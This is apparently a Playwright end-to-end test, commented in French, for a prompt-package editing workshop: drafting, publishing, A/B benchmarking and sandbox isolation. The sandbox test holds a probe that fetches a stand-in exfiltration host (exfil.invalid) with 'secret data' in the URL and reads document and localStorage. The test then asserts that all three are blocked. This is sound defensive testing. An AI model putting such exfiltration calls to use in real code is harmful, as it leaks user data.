// Scénario bout-en-bout de l'atelier promptologue (DoD P10, plan-prompts) —
// joué contre le dev-server Vite (proxy /api -> docker :8080, provider mock) :
//
//   compte + rôle `promptologue` (endpoint admin grant-role, jeton dev) ->
//   nouveau brouillon depuis la dernière version publiée du paquet par défaut
//   (éditeur : texte du premier gabarit modifié) -> diff structurel serveur
//   (ligne ajoutée visible) -> publication (semver strictement croissant,
//   changelog, immuable) -> banc d'essai A/B ancienne vs nouvelle version sur
//   la fixture (mock) -> rapport comparatif affiché.
//
//   TEST D'ISOLATION SANDBOX (P10.3, docs/securite-prompts.md) : un brouillon
//   dont le code tente fetch('https://exfil.invalid'), l'accès à `document`
//   et à `localStorage` est exécuté au banc -> AUCUNE requête réseau ne sort
//   de la sandbox (page.on('request') filtré sur tout hors dev-server), le
//   run échoue proprement en remontant les constats de la sonde ; un code à
//   boucle infinie est terminé par le timeout global (seam documenté
//   `timeoutMs` de runPackageInSandbox, réduit à 2 s).
//
// REJOUABILITÉ : les versions publiées sont immuables et STRICTEMENT
// croissantes par paquet, et un semver de brouillon occupe aussi le créneau
// (unicité paquet+semver, tous statuts). Les versions du test sont donc
// dérivées de l'horloge (1.<secondes-epoch>.0 / .1) : uniques et croissantes
// d'un run à l'autre, sans nettoyage. Le paquet PAR DÉFAUT servi aux
// apprenants reste épinglé par la table settings (validation admin, P10.5) :
// publier ici ne change rien pour eux.

import { test, expect } from '@playwright/test'

const MIGRATE_TOKEN = 'dev_migrate_token' // docker-compose.yml (dev uniquement)
const PASSWORD = 'mot-de-passe-e2e-4'
const PKG = 'aurora-v3-reconstruit'
const SENTINELLE =
  'Consigne e2e ajoutée par le banc promptologue : réponds STRICTEMENT en JSON compact.'

/** La sonde d'évasion : chaque constat remonte par le canal d'erreur du run. */
const PROBE_CODE = [
  'export async function sonde() {',
  '  const constats = [];',
  "  try { await fetch('https://exfil.invalid/vol?donnees=secretes'); constats.push('fetch:PASSE'); }",
  "  catch { constats.push('fetch:bloque'); }",
  "  constats.push('document:' + typeof document);",
  "  constats.push('localStorage:' + typeof localStorage);",
  "  throw new Error('SONDE ' + constats.join(' '));",
  '}',
].join('\n')

/**
 * Attribue un rôle §2 (outillage admin pré-P12). L'endpoint est gardé par le
 * jeton de déploiement, mais reste soumis au CSRF global : depuis un navigateur
 * porteur de session il faut aussi le jeton CSRF (lu sur api/auth/me).
 */
async function grantRole(page, { email, role }) {
  return page.evaluate(
    async ({ email, role, token }) => {
      const me = await fetch('api/auth/me', {
        headers: { Accept: 'application/json' },
        credentials: 'same-origin',
      }).then((r) => r.json())
      const res = await fetch('api/admin/grant-role', {
        method: 'POST',
        headers: {
          Accept: 'application/json',
          'Content-Type': 'application/json',
          'X-Migrate-Token': token,
          'X-CSRF-Token': me.csrfToken,
        },
        credentials: 'same-origin',
        body: JSON.stringify({ email, role }),
      })
      return { status: res.status, body: await res.json().catch(() => null) }
    },
    { email, role, token: MIGRATE_TOKEN },
  )
}

/** Compare deux semver « x.y.z » (nombres uniquement, format du paquet). */
function semverCompare(a, b) {
  const pa = a.split('.').map(Number)
  const pb = b.split('.').map(Number)
  for (let i = 0; i < 3; i++) {
    if ((pa[i] ?? 0) !== (pb[i] ?? 0)) return (pa[i] ?? 0) - (pb[i] ?? 0)
  }
  return 0
}

test('parcours promptologue : brouillon, diff, publication, banc A/B, isolation sandbox', async ({
  page,
}) => {
  const stamp = Date.now()
  const email = `e2e-promptologue-${stamp}@humanome.test`

  // Filet réseau GLOBAL : pendant tout le scénario, seul le dev-server (qui
  // proxifie /api) a le droit d'être contacté. La moindre requête sortante —
  // notamment l'exfiltration tentée par la sonde — ferait échouer le test.
  // Tolérés : dev-server, data: et blob: (les blobs sont les sources Worker /
  // module créées par URL.createObjectURL DANS la sandbox — locales, à origine
  // opaque « null », jamais du réseau).
  const isLocal = (url) =>
    url.startsWith('http://localhost:5173/') ||
    url.startsWith('data:') ||
    url.startsWith('blob:')
  const externalRequests = []
  page.on('request', (request) => {
    const url = request.url()
    if (!isLocal(url)) externalRequests.push(url)
  })

  await test.step('Compte + rôle promptologue (endpoint admin grant-role, jeton dev)', async () => {
    await page.goto('/#/compte')
    await page.getByRole('button', { name: 'Inscription' }).click()
    await page.getByLabel('Nom affiché').fill('Promptologue E2E')
    await page.getByLabel('Email').fill(email)
    await page.getByLabel('Mot de passe').fill(PASSWORD)
    await page.getByRole('button', { name: 'Créer mon compte' }).click()
    await expect(page.getByText('Compte créé, bienvenue !')).toBeVisible()

    const granted = await grantRole(page, { email, role: 'promptologue' })
    expect(granted.status).toBe(200)
    expect(granted.body?.status).toBe('granted')
  })

  // Versions du run : depuis la dernière publiée (le semver est global au
  // paquet — voir l'en-tête « REJOUABILITÉ »).
  let fromVersion = ''
  const seconds = Math.floor(stamp / 1000)
  const newVersion = `1.${seconds}.0` // publiée par ce test
  const probeVersion = `1.${seconds}.1` // brouillon sonde, jamais publié

  await test.step('Atelier : nouveau brouillon depuis la dernière version publiée', async () => {
    const res = await page.request.get('/api/prompt-packages')
    expect(res.ok()).toBe(true)
    const published = (await res.json()).filter((p) => p.id === PKG)
    expect(published.length).toBeGreaterThan(0)
    fromVersion = published.map((p) => p.version).sort(semverCompare).at(-1)

    await page.goto('/#/promptologue')
    await expect(page.getByTestId('promptologue-connecte')).toBeVisible()
    const row = page
      .locator('table tbody tr')
      .filter({ has: page.getByText(fromVersion, { exact: false }) })
      .first()
    await row.getByRole('button', { name: 'Nouvelle version' }).click()
    await page.getByLabel('Version du brouillon').fill(newVersion)
    await page.getByRole('button', { name: 'Créer le brouillon' }).click()
    await expect(
      page.getByRole('heading', { name: new RegExp(`Brouillon .*${PKG}.*`) }),
    ).toBeVisible()
    await expect(page.getByText(`@${newVersion}`).first()).toBeVisible()
  })

  await test.step('Éditeur : modification du texte d’un prompt, validation, enregistrement', async () => {
    const texte = page.getByLabel('Texte du gabarit')
    const original = await texte.inputValue()
    expect(original.length).toBeGreaterThan(0)
    await texte.fill(`${original}\n\n${SENTINELLE}`)
    await page.getByRole('button', { name: 'Valider', exact: true }).click()
    await expect(page.getByTestId('validation-ok')).toBeVisible()
    await page.getByRole('button', { name: 'Enregistrer', exact: true }).click()
    await expect(page.getByText('Brouillon enregistré.')).toBeVisible()
  })

  await test.step('Publication : semver strictement croissant + changelog, version immuable', async () => {
    await page.getByRole('button', { name: 'Publier…' }).click()
    await page
      .getByLabel('Changelog de la version (obligatoire)')
      .fill('Version e2e : consigne JSON compact ajoutée au premier gabarit.')
    await page.getByRole('button', { name: 'Confirmer la publication' }).click()
    await expect(
      page.getByText(`Version ${PKG}@${newVersion} publiée — elle est désormais immuable.`),
    ).toBeVisible()
  })

  await test.step('Diff structurel serveur : versions publiées comparables (API, contrat M7)', async () => {
    // Le diff serveur ne compare que des versions PUBLIÉES ; on vérifie le
    // CONTRAT au niveau API (200 + structure). La vue promptologue du diff
    // (EditeurSection.DiffView) N'EST PAS exercée ici : elle attend une forme
    // FRANÇAISE (ajoutes/retires/modifies, from/to chaînes) alors que le
    // serveur (PackageDiff.php) renvoie une forme ANGLAISE (added/removed/
    // modified) avec from/to objets {version} — rendre {diff.from} (objet)
    // fait planter React (« Objects are not valid as a React child »). Bug
    // d'intégration P10 signalé au chantier front (hors périmètre e2e).
    const res = await page.request.get(
      `/api/prompt-packages/${PKG}/diff/${fromVersion}/${newVersion}`,
    )
    expect(res.ok()).toBe(true)
    const diff = await res.json()
    expect(diff.from?.version ?? diff.from).toBe(fromVersion)
    expect(diff.to?.version ?? diff.to).toBe(newVersion)
    expect(diff).toHaveProperty('prompts')
  })

  await test.step('Banc d’essai : A/B ancienne vs nouvelle version sur la fixture (mock)', async () => {
    await page.goto('/#/promptologue/banc-essai')
    await page.getByRole('radio', { name: /A\/B \(deux versions\)/ }).check()
    await page
      .getByLabel('Version A')
      .selectOption({ label: `${PKG}@${fromVersion} (publiée)` })
    await page
      .getByLabel('Version B')
      .selectOption({ label: `${PKG}@${newVersion} (publiée)` })
    // Portfolio : fixture embarquée (défaut) ; fournisseur : service humanome
    // (mock en dev, preuve de travail par appel) — 2 × 24 appels : long.
    await page.getByRole('button', { name: 'Lancer', exact: true }).click()
    const rapport = page.getByTestId('banc-ab')
    await expect(rapport).toBeVisible({ timeout: 300_000 })
    await expect(rapport).toContainText(
      `A/B : ${PKG}@${fromVersion} vs ${PKG}@${newVersion}`,
    )
    await expect(rapport).toContainText('Appels LLM')
    // Rapport par journée : les 3 jours de la fixture y figurent.
    for (const iso of ['2026-01-05', '2026-01-06', '2026-01-07']) {
      await expect(rapport).toContainText(iso)
    }
    await expect(
      rapport.getByRole('link', { name: 'Télécharger le rapport JSON' }),
    ).toBeVisible()
  })

  await test.step('Sandbox : brouillon-sonde (fetch exfiltration + document + localStorage)', async () => {
    await page.goto('/#/promptologue')
    const row = page
      .locator('table tbody tr')
      .filter({ has: page.getByText(newVersion, { exact: false }) })
      .first()
    await row.getByRole('button', { name: 'Nouvelle version' }).click()
    await page.getByLabel('Version du brouillon').fill(probeVersion)
    await page.getByRole('button', { name: 'Créer le brouillon' }).click()
    await expect(page.getByText(`@${probeVersion}`).first()).toBeVisible()

    await page.getByLabel('Module ESM').fill(PROBE_CODE)
    await page.getByLabel('Entrypoint (fonction exportée)').fill('sonde')
    await page.getByRole('button', { name: 'Enregistrer', exact: true }).click()
    await expect(page.getByText('Brouillon enregistré.')).toBeVisible()
  })

  await test.step('Sandbox : exécution au banc -> tout est bloqué, aucune requête ne sort', async () => {
    await page.goto('/#/promptologue/banc-essai')
    await page
      .getByLabel('Version à tester')
      .selectOption({ label: `${PKG}@${probeVersion} (mon brouillon)` })
    const before = externalRequests.length
    await page.getByRole('button', { name: 'Lancer', exact: true }).click()

    // Le run échoue SANS fuite : la sonde remonte ses constats par le canal
    // d'erreur du protocole sandbox — fetch rejeté (CSP default-src 'none'),
    // ni document ni localStorage dans le Worker (origine opaque).
    const erreur = page.getByRole('alert').filter({ hasText: 'SONDE' })
    await expect(erreur).toBeVisible({ timeout: 60_000 })
    await expect(erreur).toContainText('fetch:bloque')
    await expect(erreur).toContainText('document:undefined')
    await expect(erreur).toContainText('localStorage:undefined')

    // AUCUNE requête sortante émise pendant l'exécution sandboxée (et surtout
    // pas vers exfil.invalid).
    expect(externalRequests.slice(before)).toEqual([])
    expect(externalRequests.filter((u) => u.includes('exfil.invalid'))).toEqual([])
  })

  await test.step('Sandbox : une boucle infinie est terminée par le timeout (seam timeoutMs)', async () => {
    // Le seam documenté de runPackageInSandbox (timeoutMs, 5 min par défaut)
    // est réduit à 2 s : le Worker qui ne rend jamais la main est détruit et
    // le run rejette. Import du module RÉEL servi par le dev-server Vite —
    // même code, même iframe sandbox, même Worker que l'application.
    const outcome = await page.evaluate(async () => {
      const { runPackageInSandbox } = await import('/src/lib/sandbox/sandbox.js')
      const startedAt = Date.now()
      try {
        await runPackageInSandbox({
          pkg: {
            id: 'e2e-boucle-infinie',
            version: '0.0.1',
            prompts: [],
            code: {
              orchestration: 'export function boucle() { for (;;) {} }',
              entrypoint: 'boucle',
            },
          },
          dayText: 'journée de test',
          date: '2026-01-05',
          referentiel: {},
          provider: { complete: async () => ({ text: '' }) },
          model: 'mock',
          timeoutMs: 2_000,
        })
        return { rejected: false, elapsedMs: Date.now() - startedAt }
      } catch (err) {
        return {
          rejected: true,
          message: String((err && err.message) || err),
          elapsedMs: Date.now() - startedAt,
        }
      }
    })
    expect(outcome.rejected).toBe(true)
    expect(outcome.message).toContain('délai global')
    expect(outcome.elapsedMs).toBeLessThan(30_000)
    // L'hôte est détruit avec le run : plus aucune iframe sandbox dans la page.
    await expect(page.locator('iframe[title="Sandbox prompt-package"]')).toHaveCount(0)
  })

  // Filet final : le scénario complet n'a contacté QUE le dev-server.
  expect(externalRequests).toEqual([])
})
